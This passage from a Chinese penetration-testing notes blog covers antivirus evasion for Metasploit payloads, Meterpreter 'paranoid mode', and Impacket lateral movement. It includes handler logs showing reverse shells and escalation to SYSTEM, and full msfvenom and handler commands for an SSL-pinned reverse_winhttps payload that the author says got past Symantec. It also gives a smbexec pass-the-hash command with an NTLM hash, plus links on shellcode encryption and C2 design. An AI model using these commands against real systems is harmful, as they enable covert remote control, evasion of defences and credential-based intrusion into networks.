<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">4</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">3887</span><span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">27</span> <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">27</span> ‐<span class="token number">0500</span>

meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> WIN03X64\Administrator
meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><strong>第二次优化payload：</strong></p>
<p>载入PEID</p>
<p><img src="https://img-blog.csdnimg.cn/20201008204752173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
合并data to text，rdata to text 在次生成。<br>
<img src="https://img-blog.csdnimg.cn/20201008204809302.png#pic_center" alt="在这里插入图片描述"><br>
Section变化如下：</p>
<p><img src="https://img-blog.csdnimg.cn/20201008204818196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
payload大小如下：<br>
4096字节</p>
<p><img src="https://img-blog.csdnimg.cn/2020100820482925.png#pic_center" alt="在这里插入图片描述"><br>
第二次靶机测试：分别测试Windows 2003，Windws 7，reverse OK。<br>
<img src="https://img-blog.csdnimg.cn/20201008204837849.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">9</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">3891</span><span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">27</span> <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">46</span><span class="token punctuation">:</span><span class="token number">20</span> ‐<span class="token number">0500</span>

meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> WIN03X64\Administrator
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">1232</span>
</code></pre>
<p><strong>第三次优化payload：</strong></p>
<p>在00000E60起含有大部分000h，充填掉00，在次生成payload。</p>
<pre><code class="prism language-c"><span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span> <span class="token number">000</span>h<span class="token punctuation">,</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008204906636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>payload大小如下：</strong></p>
<p>3174字节<br>
<img src="https://img-blog.csdnimg.cn/2020100820492649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
第三次靶机测试：分别测试Windows 2003，Windws 7，reverse OK。并且最终编译运行库依然为：/MT<br>
<img src="https://img-blog.csdnimg.cn/20201008204939451.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020100820494468.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">11</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">3894</span><span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">27</span> <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span><span class="token number">30</span> ‐<span class="token number">0500</span> <span class="token number">6</span>
meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> WIN03X64\Administrator
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">3152</span>
meterpreter <span class="token operator">&gt;</span> getsystem
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>got system via technique <span class="token number">1</span> <span class="token punctuation">(</span>Named Pipe Impersonation <span class="token punctuation">(</span>In Memory<span class="token operator">/</span>Admin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>
meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> NT AUTHORITY\SYSTEM
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008204956158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>第四次优化payload：</strong><br>
…<br>
文中的前三次优化，三次生成，已满足大部分实战场景。当遇到更苛刻的实战场景，75776字节优化到3174字节，接下来的季中，会继续优化。</p>
<hr>
<h2><a id="9116_small_payload_2003"></a>9.1.16 基于实战中的small payload应用（二）</h2>
<p>这方法我就不写出来了…等我真实复现了会写出来…敏感！</p>
<hr>
<h2><a id="9117_Go_shellcode_2007"></a>9.1.17 基于Go内存加载 shellcode（三）</h2>
<p>这方法我就不写出来了…等我真实复现了会写出来…敏感！…</p>
<hr>
<h2><a id="9118_msf_2011"></a>9.1.18 免杀技术之msf偏执模式</h2>
<p><strong>1、介绍</strong></p>
<p>在某些环境下，我们需要用到meterpreter的偏执模式(paranoid mode)。</p>
<p>偏执模式在面对接受的请求很多的时候，可以有效过滤筛选回连的请求，只留下自己所需要的。</p>
<p>同时，因为其使用了SSL/TLS 认证，因此在应对流量监控和分析时，有很不错的效果，当然也能够Bypass av(by data stream)。</p>
<p><strong>2、创建一个SSL/TLS证书</strong></p>
<p>在kali或者其他带有openssl的环境下：</p>
<pre><code class="prism language-c">$ openssl req <span class="token operator">-</span>new <span class="token operator">-</span>newkey rsa<span class="token punctuation">:</span><span class="token number">4096</span> <span class="token operator">-</span>days <span class="token number">365</span> <span class="token operator">-</span>nodes <span class="token operator">-</span>x509 \
    <span class="token operator">-</span>subj <span class="token string">"/C=US/ST=Texas/L=Austin/O=Development/CN=green-m.github.io"</span> \
    <span class="token operator">-</span>keyout green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>key \
    <span class="token operator">-</span>out green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>crt <span class="token operator">&amp;&amp;</span> \
cat green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>key  green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>crt <span class="token operator">&gt;</span> green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>pem <span class="token operator">&amp;&amp;</span> \
rm <span class="token operator">-</span>f green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>key  green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>crt
</code></pre>
<p>你可以把green-m.github.io这个URL改成任意你想回连的地址，直接指定相应IP也可以。<br>
<img src="https://img-blog.csdnimg.cn/20201008210456747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如果你能搞到一个受信任的证书颁发机构签名的SSL/TLS证书，那就碉堡了，流量直接畅通无阻。</p>
<p><strong>3、生成偏执模式的 payload</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_winhttps LHOST<span class="token operator">=</span>green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io LPORT<span class="token operator">=</span><span class="token number">443</span> PayloadUUIDTracking<span class="token operator">=</span>true HandlerSSLCert<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>pem StagerVerifySSLCert<span class="token operator">=</span>true PayloadUUIDName<span class="token operator">=</span>Green_m <span class="token operator">-</span>f exe <span class="token operator">-</span>o <span class="token punctuation">.</span><span class="token operator">/</span>Green_m<span class="token punctuation">.</span>exe
</code></pre>
<p>通过设置PayloadUUIDTracking和PayloadUUIDName可以在监听的时候过滤掉不需要的回连请求。为了Bypass av的需求，你还可以生成shellcode来自己编译。</p>
<p>如果网络环境不好，你还可以使用stageless的payload，-p参数指定windows/meterpreter_reverse_https，其他不用修改</p>
<p><strong>4、监听偏执模式</strong></p>
<pre><code class="prism language-c">msfconsole
use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
set PAYLOAD windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_winhttps
set LHOST green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io
set LPORT <span class="token number">443</span>
set HandlerSSLCert <span class="token punctuation">.</span><span class="token operator">/</span>green<span class="token operator">-</span>m<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token punctuation">.</span>pem
set IgnoreUnknownPayloads true
set StagerVerifySSLCert true
set exitonsession false
run <span class="token operator">-</span>j <span class="token operator">-</span>z
</code></pre>
<p>设置HandlerSSLCert和StagerVerifySSLCert参数来使用TLS pinning，IgnoreUnknownPayloads接受白名单的payload。</p>
<p>同上，stageless 修改相应payload。</p>
<p><strong>总结：</strong> 偏执模式基于SSL/TLS认证过某些流量监控效果应该很不错，测试也过了symantec，仅供参考。</p>
<p>参考文章：<code>https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode#create-a-ssltls-certificate</code></p>
<p><strong>演示</strong></p>
<p><strong>生成证书</strong></p>
<pre><code class="prism language-c">openssl req <span class="token operator">-</span>new <span class="token operator">-</span>newkey rsa<span class="token punctuation">:</span><span class="token number">4096</span> <span class="token operator">-</span>days <span class="token number">365</span> <span class="token operator">-</span>nodes <span class="token operator">-</span>x509 <span class="token operator">-</span>subj <span class="token string">"/C=US/ST=Texas/L=Austin/O=Development/CN=192.168.1.150"</span>  <span class="token operator">-</span>keyout <span class="token number">150.</span>key <span class="token operator">-</span>out <span class="token number">150.</span>crt
cat <span class="token number">150.</span>key <span class="token number">150.</span>crt <span class="token operator">&gt;</span> <span class="token number">150.</span>pem <span class="token operator">&amp;&amp;</span> rm <span class="token operator">-</span>rf <span class="token number">150.</span>key <span class="token number">150.</span>crt
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008210809640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>生成payload</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_winhttps LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.150</span> LPORT<span class="token operator">=</span><span class="token number">443</span> PayloadUUIDTracking<span class="token operator">=</span>true HandlerSSLCert<span class="token operator">=</span><span class="token number">150.</span>pem StagerVerifySSLCert<span class="token operator">=</span>true PayloadUUIDName<span class="token operator">=</span>Test <span class="token operator">-</span>f exe <span class="token operator">-</span>o Test<span class="token punctuation">.</span>exe
</code></pre>
<p><strong>启动监听</strong><br>
<img src="https://img-blog.csdnimg.cn/20201008210835837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="9119_shellcode_2087"></a>9.1.19 免杀技术之生成shellcode自行编译</h2>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>leanote<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>snowming<span class="token operator">/</span><span class="token number">5e915</span>cdcdf79
</code></pre>
<p>书上的待复现！！</p>
<h2><a id="9120__2094"></a>9.1.20 免杀技术之代码加密</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>secrss<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span><span class="token number">12694</span>
</code></pre>
<p>shellcode代码加密…</p>
<hr>
<h2><a id="9121_cmeterpreter_2102"></a>9.1.21 免杀技术之使用c实现meterpreter功能</h2>
<p>这是一个不错的思路…<br>
<img src="https://img-blog.csdnimg.cn/20201008211510264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xz<span class="token punctuation">.</span>aliyun<span class="token punctuation">.</span>com<span class="token operator">/</span>t<span class="token operator">/</span><span class="token number">2888</span>
</code></pre>
<p>书上待现！！</p>
<hr>
<h2><a id="9121_360_2112"></a>9.1.21 白加黑免杀过360开机启动拦截</h2>
<p>此方法不会写出来…设计天融信产品，等违法违规方法…</p>
<p>知道有这方法即可…</p>
<hr>
<h2><a id="9122_c_2118"></a>9.1.22 使用c#实现简单的分离免杀</h2>
<p>书上写的方法后期会复现，主要是：<br>
简单的免杀处理过360、 defender应该是没什么问题的，通过举一反三我们还可以通过隐写术将 shellcode藏在图片里面,从图片里面提取shellcode处理然后执行。或者我们可以写一些加密算法,让远程传入shellcode文件不能被识别或者执行的时候解密执行不被杀软发现</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>LyShark<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">11331476.</span>html   <span class="token operator">--</span>Payload 实现分离免杀
</code></pre>
<hr>
<h2><a id="92_C2_2127"></a>9.2 命令与控制-C2（简单理解）</h2>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>leanote<span class="token punctuation">.</span>com<span class="token operator">/</span>post<span class="token operator">/</span>snowming<span class="token operator">/</span><span class="token number">50448511</span>de58  <span class="token operator">--</span>Cobalt Strike 外部 C2【一、原理篇】

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">4</span>hou<span class="token punctuation">.</span>com<span class="token operator">/</span>posts<span class="token operator">/</span>B8nx  <span class="token operator">--</span>攻击者如何设计一个点对点的命令与控制（C2）服务器

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1597767</span>   <span class="token operator">--</span>Red<span class="token operator">-</span>Team<span class="token operator">-</span>Tools开源C2开发后框架列表
</code></pre>
<hr>
<h1><a id="_2139"></a>十、安全工具教学</h1>
<h2><a id="101_Impacket_2140"></a>10.1 Impacket套件之远程命令执行功能讲解</h2>
<h2><a id="_2142"></a>前言</h2>
<pre><code>Impacket官方介绍为用于处理网络协议的Python类的集合，该集合包含了渗透测试中常见的工具种类，包括远程命令执行、信息收集、票据传递、凭据获取、中间人攻击测试等。该套件里的工具使用也是linux主机跳向windows主机的方式之一。

本篇文章主要讲解Impacket套件内远程命令执行工具在实际工作中的使用，其中包含全交互式工具(通常适用于内网环境下或socks代理环境下)、半交互式工具(通常适用于webshell环境下)。应用环境如下。

1.已有权限主机(包含webshell)不可出外网。
2.已获取到一些NTLM哈希字符串，但解不出明文密码，无法通过ipc、rpd等登陆目标主机。
3.已有权限主机可以出网，但出于某些原因需要在socks代理或端口转发的环境下进行内网渗透测试。

Impacket套件里远程命令执行工具均支持密码、NTLM、票据认证，本文将会讲到密码和NTLM的使用方式，票据认证使用方式会在后续Impacket票据工具使用中详细讲解。
</code></pre>
<p>以下测试环境为</p>
<p>已有权限主机：192.XXX.X.144 (win2012)</p>
<p>目标主机:192.XXX.X.76 (win8.1)</p>
<p>测试反弹、下载外网vps ip: 10x.xx.xx.x7</p>
<p>已掌握情况为:当前已获取部分ntlm哈希、密码，并尝试内网横向扩展。</p>
<h2><a id="smbexe_2168"></a>smbexe</h2>
<p>smbexe为全交互式工具，所以不可用于webshell环境，可用于rdp等有交互环境登录使用或socks代理环境下使用。</p>
<p>此处测试环境独立于本篇文章测试环境，仅为说明，本篇文章内Impacket工具使用认证的账号rid必须为500，从winows 2008开始(包括2008)，rid不为500的用户，windows都不允许远程连接(包括net use、at、winrm等)，所以如果想对目标机远程执行命令，必须使用目标机rid 500的账号(通常为administrator)或域管账号。</p>
<p>通过查看wrw账号，发现该用户处于administrators组<br>
<img src="https://img-blog.csdnimg.cn/20201008212643651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
如下图 执行以下两条操作，可发现使用管理组账号wrw进行smbexec.py远程执行命令操作会提示权限不足。</p>
<pre><code class="prism language-c">python smbexec<span class="token punctuation">.</span>py <span class="token punctuation">.</span><span class="token operator">/</span>administrator<span class="token punctuation">:</span>Win2008@<span class="token number">192.</span>XXX<span class="token punctuation">.</span><span class="token number">229.157</span>
python smbexec<span class="token punctuation">.</span>py <span class="token punctuation">.</span><span class="token operator">/</span>wrw<span class="token punctuation">:</span>Win2008@<span class="token number">192.</span>XXX<span class="token punctuation">.</span><span class="token number">229.157</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008212704311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
以下内容继续在测试环境测试</p>
<p>在socks网络环境下(图中所示socks工具为proxifier)，使用NTLM hash认证对远程主机192.XXX.3.76执行命令，smbexec产生一个伪交互的cmd shell</p>
<pre><code class="prism language-c">smbexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>hashes <span class="token punctuation">:</span>DF92E298362E3E180EC0EE7226AFB825 <span class="token punctuation">.</span><span class="token operator">/</span>administrator@<span class="token number">192.</span>XXX<span class="token punctuation">.</span><span class="token number">3.76</span>
</code></pre>
